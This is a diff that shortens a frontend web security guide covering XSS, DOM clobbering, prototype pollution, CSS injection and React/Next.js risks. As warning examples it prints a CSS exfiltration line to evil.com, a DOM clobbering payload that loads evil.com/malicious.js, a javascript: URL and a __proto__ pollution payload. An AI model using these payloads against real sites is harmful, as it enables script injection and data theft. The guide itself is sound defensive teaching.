@@ -2,7 +2,7 @@
 
 ## XSS Prevention
 
-### Rule #1: Never insert untrusted data into HTML without sanitization
+### Never insert untrusted data into HTML without sanitization
 
 ```javascript
 // SAFE: textContent (auto-escapes)
@@ -19,14 +19,14 @@ const clean = DOMPurify.sanitize(dirty, {
   ALLOW_DATA_ATTR: false
 });
 
-// DANGEROUS — never do:
+// DANGEROUS:
 element.innerHTML = userInput;
 document.write(userInput);
 element.outerHTML = userInput;
 element.insertAdjacentHTML('beforeend', userInput);
 ```
 
-### Rule #2: Escape by context
+### Escape by context
 
 | Context | Method | Example |
 |---------|--------|---------|
@@ -36,7 +36,7 @@ element.insertAdjacentHTML('beforeend', userInput);
 | URL parameter | `encodeURIComponent()` | `%3Cscript%3E` |
 | CSS value | Whitelist allowed values | Never insert user data |
 
-### Rule #3: Sanitize URLs
+### Sanitize URLs
 
 ```javascript
 function isSafeUrl(url) {
@@ -47,14 +47,8 @@ function isSafeUrl(url) {
     return false;
   }
 }
-
-// Use before setting href, src, action, formaction, etc.
-if (isSafeUrl(userUrl)) {
-  link.href = userUrl;
-}
-
-// Block javascript: protocol
-// <a href="javascript:alert(1)"> — classic XSS
+// Apply before setting href, src, action, formaction
+// Blocks javascript: protocol — <a href="javascript:alert(1)">
 ```
 
 ## DOM Safety
@@ -64,11 +58,6 @@ if (isSafeUrl(userUrl)) {
 const div = document.createElement('div');
 div.textContent = userInput;
 container.appendChild(div);
-
-// SAFE: template literals for structure, textContent for data
-const li = document.createElement('li');
-li.textContent = item.name;
-list.appendChild(li);
 
 // DANGEROUS:
 container.innerHTML = `<div>${userInput}</div>`; // XSS
@@ -81,63 +70,44 @@ setInterval(userInput, 1000); // XSS if string
 ## Template Engines (Server-Side)
 
 ```javascript
-// Handlebars — auto-escapes by default
-// {{variable}} = escaped (SAFE)
-// {{{variable}}} = raw (DANGEROUS with user data)
+// Handlebars: {{var}} = escaped (SAFE); {{{var}}} = raw (DANGEROUS with user data)
 
 // Nunjucks — enable autoescape
-const nunjucks = require('nunjucks');
 nunjucks.configure('views', {
   autoescape: true,
   throwOnUndefined: true
 });
-// {{ variable }} = escaped (SAFE)
-// {{ variable | safe }} = raw (DANGEROUS with user data)
+// {{ var }} = escaped (SAFE); {{ var | safe }} = raw (DANGEROUS)
 
-// EJS — use correct tags
-// <%= variable %> = escaped (SAFE)
-// <%- variable %> = raw (DANGEROUS with user data)
+// EJS: <%= var %> = escaped (SAFE); <%- var %> = raw (DANGEROUS)
 ```
 
 Rules:
 - Always enable autoescape
-- Never use raw/unescaped output with user data
-- Never render user-controlled templates (SSTI vulnerability)
+- Never raw/unescaped output with user data
+- Never render user-controlled templates (SSTI)
 - Never pass user input to template file path (path traversal)
 
 ## postMessage Security
 
 ```javascript
-// RECEIVING messages — always verify origin
+// RECEIVING — always verify origin
 window.addEventListener('message', (event) => {
   if (event.origin !== 'https://trusted-domain.com') return;
-
   const data = event.data;
-  // validate data structure before using
-  if (typeof data?.action !== 'string') return;
-
-  // process...
+  if (typeof data?.action !== 'string') return; // validate structure before use
 });
 
-// SENDING messages — always specify target origin
+// SENDING — always specify target origin; never '*' with sensitive data
 iframe.contentWindow.postMessage(data, 'https://target-domain.com');
-// NEVER use '*' as target origin with sensitive data
 ```
 
 ## localStorage / sessionStorage
 
+Never store: auth tokens (use httpOnly cookies), passwords/secrets, PII, session IDs.
+OK: UI preferences, non-sensitive cache, CSRF tokens (second factor only, not sole protection).
+
 ```javascript
-// Never store:
-// - Auth tokens (use httpOnly cookies)
-// - Passwords or secrets
-// - PII (personal data)
-// - Session identifiers
-
-// OK to store:
-// - UI preferences (theme, language)
-// - Non-sensitive cache (product list)
-// - CSRF tokens (as second factor, not sole protection)
-
 // Always validate data read from storage
 const cached = localStorage.getItem('prefs');
 try {
@@ -152,52 +122,41 @@ try {
 ## Form Security
 
 ```html
-<!-- CSRF protection -->
 <form method="POST" action="/transfer">
   <input type="hidden" name="_csrf" value="{{csrfToken}}">
-  <!-- form fields -->
 </form>
 
-<!-- Autocomplete off for sensitive fields -->
 <input type="password" autocomplete="new-password">
 <input type="text" name="credit-card" autocomplete="off">
 ```
 
-```javascript
-// Client-side validation is NOT security
-// Always validate server-side
-// Client validation = UX only
-```
+Client-side validation = UX only; always validate server-side.
 
 ## Third-Party Scripts
 
 ```html
-<!-- Always use SRI (Subresource Integrity) for CDN scripts -->
+<!-- SRI on all CDN scripts/styles -->
 <script
   src="https://cdn.example.com/lib.js"
   integrity="sha384-HASH_HERE"
   crossorigin="anonymous"
 ></script>
 
-<!-- Generate SRI hash -->
-<!-- openssl dgst -sha384 -binary lib.js | openssl base64 -A -->
+<!-- Generate hash: openssl dgst -sha384 -binary lib.js | openssl base64 -A -->
 ```
 
 Rules:
 - Pin CDN URLs to specific versions (never `/latest/`)
-- Use SRI hashes for all external scripts and styles
-- Self-host critical libraries when possible
+- SRI on all external scripts and styles
+- Self-host critical libraries
 - Audit third-party scripts periodically
-- Load analytics/tracking in sandboxed iframe or via GTM with CSP
+- Load analytics/tracking in sandboxed iframe or GTM with CSP
 
 ## iframe Security
 
 ```html
-<!-- Prevent your page from being framed (anti-clickjacking) -->
-<!-- Set via HTTP header: X-Frame-Options: DENY -->
-<!-- Or CSP: frame-ancestors 'none' -->
+<!-- Anti-clickjacking: header X-Frame-Options: DENY, or CSP frame-ancestors 'none' -->
 
-<!-- When embedding iframes: sandbox them -->
 <iframe
   src="https://external.com/widget"
   sandbox="allow-scripts allow-same-origin"
@@ -205,129 +164,96 @@ Rules:
 ></iframe>
 ```
 
-`sandbox` attribute flags:
-- `allow-scripts` — allow JS execution
-- `allow-same-origin` — allow cookie/storage access
-- `allow-forms` — allow form submission
-- `allow-popups` — allow `window.open()`
-- Never combine `allow-scripts` + `allow-same-origin` for untrusted content
+sandbox flags: `allow-scripts` (JS), `allow-same-origin` (cookie/storage), `allow-forms`, `allow-popups`.
+Never combine `allow-scripts` + `allow-same-origin` for untrusted content.
 
 ## CSS Injection Prevention
 
-```css
-/* Never insert user data into CSS */
-/* DANGEROUS: */
-/* .user-avatar { background: url(USER_INPUT); } */
-/* Can exfiltrate data via: background: url(https://evil.com/?data=secret) */
-
-/* SAFE: use CSS custom properties with sanitized values */
-```
-
-Attacks via CSS:
-- Data exfiltration via `background: url()`
-- UI redress via `position: absolute`
-- Keystroke logging via `@font-face` unicode-range + scroll
-- Content hiding via `display: none` on security warnings
+Never insert user data into CSS: `background: url(USER_INPUT)` → exfil via `url(https://evil.com/?data=secret)`.
+Attacks: data exfil via `background: url()`, UI redress via `position: absolute`, keystroke logging via `@font-face` unicode-range + scroll, warning hiding via `display: none`.
+SAFE: CSS custom properties with sanitized values.
 
 ## DOM Clobbering
 
-DOM clobbering exploits browser behavior: HTML elements with `id` or `name` create global JS properties. Attacker injects "safe" HTML that overwrites variables without any script execution.
+HTML elements with `id`/`name` become global JS properties — attacker injects script-free HTML (passes sanitizers) that overwrites variables. 55% of HTML sanitizers vulnerable by default (CISPA research).
 
 ```html
-<!-- Attacker injects (passes sanitizer — no scripts!) -->
+<!-- Attacker injects — passes sanitizer, no scripts! -->
 <a id="config" href="https://evil.com/malicious.js"></a>
-
-<!-- Your code loads script from config.href -->
 <script>
-  // window.config is now the <a> element (DOM clobbered)
-  // config.href → "https://evil.com/malicious.js"
+  // window.config is now the <a> element
   const src = window.config?.href || '/default.js';
   loadScript(src); // loads attacker's script
 </script>
 ```
 
-55% of HTML sanitizers are vulnerable to DOM clobbering by default (CISPA research).
-
-Real attack chains:
-- Clobber `window.defaultConfig` → override app settings
-- Clobber `document.getElementById` return → replace DOM references
-- Double clobber: `<form id="x"><input name="y">` → `x.y` is the input element
-- Webpack AutoPublicPathRuntimeModule gadget → XSS in bundled apps (2024, Canvas LMS)
+Chains: clobber `window.defaultConfig` → override app settings; double clobber `<form id="x"><input name="y">` → `x.y`; Webpack AutoPublicPathRuntimeModule gadget → XSS in bundled apps (2024, Canvas LMS).
 
 Prevention:
 ```javascript
-// Use unique variable names, never rely on window globals
-// Always use const/let (block-scoped, can't be clobbered)
+// const/let only — block-scoped, can't be clobbered
 const config = { href: '/default.js' }; // not window.config
 
-// Validate before using any DOM-derived value
+// Validate DOM-derived values
 if (typeof config?.href !== 'string' || !config.href.startsWith('/')) {
   throw new Error('Invalid config');
 }
 
-// Use Object.freeze for sensitive configs
+// Freeze sensitive configs
 const CONFIG = Object.freeze({ apiUrl: '/api', version: '1.0' });
 ```
 
 ## Client-Side Prototype Pollution
 
 ```javascript
-// URL-based pollution (common in SPAs)
-// https://app.com/#__proto__[isAdmin]=true
+// URL-based pollution (SPAs): https://app.com/#__proto__[isAdmin]=true
 const params = new URLSearchParams(location.hash.slice(1));
 const config = {};
 for (const [key, value] of params) {
-  // Lodash _.set, jQuery $.extend, or manual deep-set
-  deepSet(config, key, value);
-  // If key = "__proto__[isAdmin]" → Object.prototype.isAdmin = "true"
+  deepSet(config, key, value); // Lodash _.set, jQuery $.extend, manual deep-set
+  // key = "__proto__[isAdmin]" → Object.prototype.isAdmin = "true"
 }
+// EVERY object now has isAdmin === "true"
 
-// Now EVERY object has isAdmin === "true"
-if (user.isAdmin) { showAdminPanel(); } // always true
-
-// Exploit chain: prototype pollution → DOM XSS
-// Pollute Object.prototype.innerHTML → injected into DOM rendering
-// Pollute Object.prototype.src → script loads from attacker URL
+// Exploit chain → DOM XSS: pollute Object.prototype.innerHTML or .src
 ```
 
 Prevention:
 ```javascript
-// Block __proto__, constructor, prototype in all input parsing
+// Block dangerous keys in all input parsing
 function isSafeKey(key) {
   return !['__proto__', 'constructor', 'prototype'].includes(key);
 }
 
-// Use Map instead of plain objects for user-controlled keys
+// Map instead of plain objects for user-controlled keys
 const userConfig = new Map();
 
-// Use Object.create(null) for lookup tables
+// Object.create(null) for lookup tables
 const lookup = Object.create(null);
 
-// Freeze prototypes in sensitive contexts
-Object.freeze(Object.prototype); // nuclear option, may break libraries
+// Nuclear option — may break libraries:
+Object.freeze(Object.prototype);
 ```
 
 ## PortSwigger Top Techniques 2025 (frontend-relevant)
 
-- **Internal cache poisoning** — manipulate cache to serve malicious responses globally
-- **Cross-Site ETag Length Leak** — leak response size cross-domain via timing
-- **Side-channel attacks** — XS-Leaks, timing attacks to extract data cross-origin
-- **SSTI polyglots** — template injection detectable via error-based techniques
-- **SAML authentication bypass** — XML signature wrapping attacks
-- **Browser redirect stalling** — new techniques to prevent/delay redirects
+- Internal cache poisoning — malicious responses served globally
+- Cross-Site ETag Length Leak — response size leak cross-domain via timing
+- XS-Leaks / side channels — cross-origin data extraction
+- SSTI polyglots — error-based detection
+- SAML authentication bypass — XML signature wrapping
+- Browser redirect stalling
 
 ## React / Next.js Security (2025-2026)
 
 ```javascript
-// CVE-2025-55182 (React2Shell, CVSS 10.0)
-// Pre-auth RCE via React Server Components deserialization
-// Single HTTP request → arbitrary code execution on server
-// Affects: React 19.x with Server Components, Next.js 13-15
-// Fix: update to latest patched version immediately
+// CVE-2025-55182 (React2Shell, CVSS 10.0): pre-auth RCE via React Server
+// Components deserialization — single HTTP request → arbitrary code execution.
+// Affects React 19.x with Server Components, Next.js 13-15.
+// Fix: update to latest patched version.
 
-// Server Actions: validate ALL input
-// "use server" functions are public API endpoints
-// Attacker can call them directly with any arguments
+// Server Actions ("use server") are public endpoints — callable directly
+// with any arguments. Validate ALL input:
 async function updateUser(formData) {
   // WRONG: trust formData
   await db.users.update({ data: Object.fromEntries(formData) });
@@ -338,9 +264,9 @@ async function updateUser(formData) {
 }
 ```
 
-Rules for React/Next.js:
+Rules:
 - Server Components/Actions = public endpoints, validate everything
 - `dangerouslySetInnerHTML` = same risk as `innerHTML`
-- Middleware auth checks alone are insufficient — verify in route handlers
-- Keep React + Next.js on latest security patches (critical RCEs found in 2025)
+- Middleware auth checks alone insufficient — verify in route handlers
+- Keep React + Next.js on latest security patches (critical RCEs in 2025)
 - URL-based routing: validate all `params` and `searchParams`
